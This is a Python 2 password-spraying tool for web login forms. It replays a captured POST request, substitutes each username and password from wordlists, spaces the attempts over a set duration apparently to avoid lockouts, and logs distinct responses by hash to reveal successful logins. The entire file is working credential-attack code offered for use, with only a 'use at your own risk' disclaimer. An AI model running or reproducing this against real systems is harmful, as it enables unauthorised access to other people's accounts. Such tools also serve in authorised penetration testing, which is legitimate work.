#!/usr/bin/python

# This program comes with no promises, warranties, or apologies. 
# Use at your own risk and responsibility.

import argparse
import requests
import os
import sys
import time
import hashlib

# Parse command line arguments

parser = argparse.ArgumentParser()

parser.add_argument("--shotgun", action="store_true", help="Spray all users with no pause.")
#parser.add_argument("--proxy", help="Specify proxy. Format 'http://127.0.0.1:8080'")
parser.add_argument("--duration", default="7200", help="Total spray duration in seconds. Default is 7200 seconds.")
parser.add_argument("--request", default="request.txt", help="Name of request file. Default is 'request.txt'.")
parser.add_argument("--usernames", default="usernames.txt", help="Name of usernames file. Default is 'usernames.txt'.")
parser.add_argument("--passwords", default="passwords.txt", help="Name of passwords file. Default is 'passwords.txt'.")

args = parser.parse_args()

# Supporting variables/work
# proxies = {'http' : 'http://10.10.110.100:8080'}
sleepTimeSeconds = int(args.duration)
if not os.path.exists("logs"):
    os.makedirs("logs")

# Ensure spray time is appropriate
if raw_input("You will be spraying every " \
        + str(sleepTimeSeconds) + " seconds. Is that cool? (y/N) ").lower() != 'y':
    sys.exit("Change spray time.")

################################################################################


# Parse request file
requestsFile = open(args.request, 'r')
lineList = requestsFile.readlines()
endPoint = lineList[0].split(' ')[1].strip()
headerDict = dict(item.split(': ') for item in map(str.strip, lineList[1:-2]))
dataDict = dict(item.split('=') for item in map(str.strip, lineList[-1].split('&')))
requestsFile.close()
if("USERPR3Y" not in dataDict.values() or "PASSPR3Y" not in dataDict.values()):
    sys.exit("Error: USERPR3Y or PASSPR3Y not present in POST request parameters.")

# Parse usernames file
usernamesFile = open(args.usernames, 'r')
usernamesList = map(str.strip, usernamesFile.readlines())
usernamesFile.close()

# Parse passwords file
passwordsFile = open(args.passwords, 'r')
passwordsList = map(str.strip, passwordsFile.readlines())
passwordsFile.close()

# Prepare injection points
usernameKey = ""
passwordKey = ""
for key,value in dataDict.iteritems():
    if value == "USERPR3Y":
        usernameKey = key
    elif value == "PASSPR3Y":
        passwordKey = key

# Spray
for password in passwordsList:

    # Get time right before spray
    date = time.strftime("%m.%d.%Y", time.gmtime())
    tyme = time.strftime("%H:%M:%S", time.gmtime())

    responseDict = {}

    # Perform spray
    for username in usernamesList:
        # Load injection points
        dataDict[usernameKey] = username
        dataDict[passwordKey] = password
        
        # Attempt login
        print "Attempting " + username + ':' + password
        url = "http://" + headerDict["Host"] + endPoint
        #response = requests.post(url=url, headers=headerDict, data=dataDict, proxies=proxies, verify=False)
        response = requests.post(url=url, headers=headerDict, data=dataDict, verify=False)

        # Create hash of response
        checksummer = hashlib.md5()
        checksummer.update(response.content)

        # Store hash of response. Chance of collision but very minimal.
        responseDict[checksummer.hexdigest()] = response

        if(not args.shotgun):
            sleepTime = float(sleepTimeSeconds)/float(len(usernamesList))
            print "Sleeping for: " + str(sleepTime) + " seconds"
            time.sleep(sleepTime)

#    meaningFulResponses = extractMeaningfulResponses(responseDict)

    # Create file
    if not os.path.exists("logs/" + date):
        os.makedirs("logs/" + date)
    if not os.path.exists("logs/" + date + '/' + tyme):
        os.makedirs("logs/" + date + '/' + tyme)

    # Write to file. Files are named with hashes that distinguish between unique responses.
    for key,value in responseDict.iteritems():
        fileOut = open("logs/" + date + '/' + tyme + '/' + key + ".html", 'w')

        # Log request. If there were redirects, log the very first request made.
        fileOut.write('-'*80 + '\n')
        fileOut.write("REQUEST")
        fileOut.write('\n' + '-'*80 + '\n')

        requestToLog = requests.Request()
        if(value.history):
            requestToLog = value.history[0].request
        else:
            requestToLog = value.request

        fileOut.write(str(requestToLog.url) + '\n\n')
        for k2,v2 in requestToLog.headers.iteritems():
            fileOut.write(k2 + ": " + v2 + '\n')
        fileOut.write('\n' + str(requestToLog.body) + '\n')

        fileOut.write('\n' + '-'*80 + '\n')
        fileOut.write("RESPONSE")
        fileOut.write('\n' + '-'*80 + '\n')

        # Log response
        fileOut.write(str(value.status_code) + ' ' + value.reason + '\n')
        for k2,v2 in value.headers.iteritems():
            fileOut.write(k2 + ": " + v2 + '\n')
        fileOut.write('\n' + value.text)

        fileOut.close()

    if(args.shotgun):
        time.sleep(sleepTimeSeconds)
